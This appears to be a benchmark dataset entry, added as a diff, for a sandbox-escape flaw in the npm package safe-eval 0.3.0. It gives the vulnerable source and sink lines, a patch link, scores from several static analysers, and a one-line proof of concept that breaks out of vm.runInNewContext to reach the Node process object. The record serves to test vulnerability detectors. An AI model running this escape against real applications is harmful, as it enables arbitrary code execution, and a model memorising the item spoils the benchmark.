@@ -1,0 +1,66 @@
+{
+    "advisory": {
+        "id": "GHSA-ww6v-677g-p656",
+        "cwe": "CWE-265"
+    },
+    "correct_cwe": "CWE-265",
+    "correct_package_link": "https://registry.npmjs.org/safe-eval/-/safe-eval-0.3.0.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "index.js",
+                    "lineno": 3,
+                    "code": "module.exports = function safeEval (code, context, opts) {"
+                },
+                "sink": {
+                    "file": "index.js",
+                    "lineno": 13,
+                    "code": "  vm.runInNewContext(code, sandbox, opts)"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "safeEval = require('safe-eval'); safeEval(\"this.constructor.constructor('return process')().exit()\");"
+        }
+    ],
+    "patch": [
+        {
+            "url": "https://github.com/hacksparrow/safe-eval/pull/8"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "D"
+        },
+        "njsscan": {
+            "score": "C"
+        },
+        "graudit": {
+            "score": "C"
+        },
+        "insidersec": {
+            "score": "C"
+        },
+        "eslint": {
+            "score": "C"
+        },
+        "appinspector": {
+            "score": "D"
+        },
+        "msdevskim": {
+            "score": "D"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "D"
+        },
+        "odgen": {
+            "score": "C"
+        }
+    }
+}
